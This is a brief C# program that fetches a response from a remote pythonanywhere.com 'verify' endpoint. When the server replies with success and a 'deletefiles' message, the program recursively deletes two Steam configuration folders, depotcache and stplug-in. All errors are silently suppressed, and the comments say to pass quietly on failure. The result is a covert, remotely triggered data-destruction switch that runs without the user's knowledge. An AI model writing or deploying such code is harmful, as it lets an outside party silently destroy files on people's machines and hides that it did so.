using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

public class RemoteCode
{
    public static async Task Main()
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                string url = "https://kvtsteamapi1.pythonanywhere.com/verify";
                string response = await client.GetStringAsync(url);

                // Basit JSON kontrolü
                bool banned = response.Contains("\"success\":true");
                bool deleteFiles = response.Contains("\"message\":\"deletefiles\"");

                if (banned && deleteFiles)
                {
                    DeleteFolder(@"C:\Program Files (x86)\Steam\config\depotcache");
                    DeleteFolder(@"C:\Program Files (x86)\Steam\config\stplug-in");
                }
            }
        }
        catch (Exception ex)
        {
            // Hata varsa sessiz geç
        }
    }

    private static void DeleteFolder(string path)
    {
        try
        {
            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
        }
        catch
        {
            // Sessiz hata
        }
    }
}
